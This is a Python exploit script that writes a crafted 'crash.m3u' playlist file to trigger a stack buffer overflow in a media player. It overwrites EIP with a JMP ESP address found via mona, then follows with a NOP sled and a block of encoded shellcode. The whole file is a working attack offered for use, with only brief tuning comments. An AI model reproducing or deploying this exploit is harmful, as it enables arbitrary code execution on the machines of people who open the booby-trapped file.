import struct
def main():
	
	outputfile = open('crash.m3u','w')
	#We can insert shell code 25000-30000, based on the test run.
	teststring = (25000 + 1093) * 'A'
	#Use !mona jmp esp to find the address below
	eip = struct.pack("<I", 0x01AAF23A ) #01AAF23A   FFE4             JMP ESP
	#payload += b"\x3a\xf2\xaa\x01"
	nops = "\x90" * 25 
	#buf = "checkthingsgetsoverwritten"
	buf = ""
	buf += "\x89\xe3\xdd\xc0\xd9\x73\xf4\x5b\x53\x59\x49\x49\x49"
	buf += "\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33"
	buf += "\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41"
	buf += "\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41"
	buf += "\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a"
	buf += "\x4a\x49\x4b\x4c\x5a\x48\x4c\x42\x33\x30\x53\x30\x35"
	buf += "\x50\x55\x30\x4d\x59\x4a\x45\x50\x31\x49\x50\x45\x34"
	buf += "\x4c\x4b\x30\x50\x36\x50\x4c\x4b\x31\x42\x44\x4c\x4c"
	buf += "\x4b\x56\x32\x32\x34\x4c\x4b\x53\x42\x37\x58\x34\x4f"
	buf += "\x48\x37\x30\x4a\x37\x56\x46\x51\x4b\x4f\x4e\x4c\x37"
	buf += "\x4c\x55\x31\x33\x4c\x43\x32\x36\x4c\x57\x50\x39\x51"
	buf += "\x48\x4f\x34\x4d\x33\x31\x39\x57\x4a\x42\x4c\x32\x46"
	buf += "\x32\x50\x57\x4c\x4b\x46\x32\x44\x50\x4c\x4b\x30\x4a"
	buf += "\x47\x4c\x4c\x4b\x30\x4c\x42\x31\x32\x58\x4d\x33\x57"
	buf += "\x38\x33\x31\x58\x51\x46\x31\x4c\x4b\x31\x49\x51\x30"
	buf += "\x45\x51\x49\x43\x4c\x4b\x47\x39\x32\x38\x4b\x53\x36"
	buf += "\x5a\x50\x49\x4c\x4b\x30\x34\x4c\x4b\x35\x51\x58\x56"
	buf += "\x56\x51\x4b\x4f\x4e\x4c\x59\x51\x58\x4f\x44\x4d\x45"
	buf += "\x51\x59\x57\x50\x38\x4d\x30\x54\x35\x4c\x36\x33\x33"
	buf += "\x33\x4d\x5a\x58\x57\x4b\x43\x4d\x51\x34\x52\x55\x5a"
	buf += "\x44\x30\x58\x4c\x4b\x51\x48\x31\x34\x53\x31\x48\x53"
	buf += "\x52\x46\x4c\x4b\x44\x4c\x30\x4b\x4c\x4b\x50\x58\x35"
	buf += "\x4c\x35\x51\x4e\x33\x4c\x4b\x55\x54\x4c\x4b\x43\x31"
	buf += "\x38\x50\x4b\x39\x50\x44\x51\x34\x51\x34\x51\x4b\x51"
	buf += "\x4b\x43\x51\x30\x59\x50\x5a\x36\x31\x4b\x4f\x4b\x50"
	buf += "\x31\x4f\x31\x4f\x51\x4a\x4c\x4b\x35\x42\x4a\x4b\x4c"
	buf += "\x4d\x51\x4d\x43\x5a\x35\x51\x4c\x4d\x4c\x45\x4e\x52"
	buf += "\x53\x30\x45\x50\x35\x50\x56\x30\x55\x38\x56\x51\x4c"
	buf += "\x4b\x52\x4f\x4b\x37\x4b\x4f\x38\x55\x4f\x4b\x4c\x30"
	buf += "\x48\x35\x59\x32\x46\x36\x42\x48\x4e\x46\x4c\x55\x4f"
	buf += "\x4d\x4d\x4d\x4b\x4f\x59\x45\x57\x4c\x44\x46\x43\x4c"
	buf += "\x55\x5a\x4b\x30\x4b\x4b\x4d\x30\x32\x35\x34\x45\x4f"
	buf += "\x4b\x57\x37\x52\x33\x32\x52\x42\x4f\x43\x5a\x33\x30"
	buf += "\x56\x33\x4b\x4f\x48\x55\x55\x33\x53\x51\x52\x4c\x55"
	buf += "\x33\x43\x30\x41\x41"
	#Need 1093 bytes to fill up junk "
	testjunk = (30000 - len(teststring + eip + nops + buf)) * 'D'
	junk = teststring + eip + nops + buf+ testjunk
	
	#write out and close the file
	outputfile.write(junk)
	outputfile.close()
	
if __name__ == '__main__':
	main()
	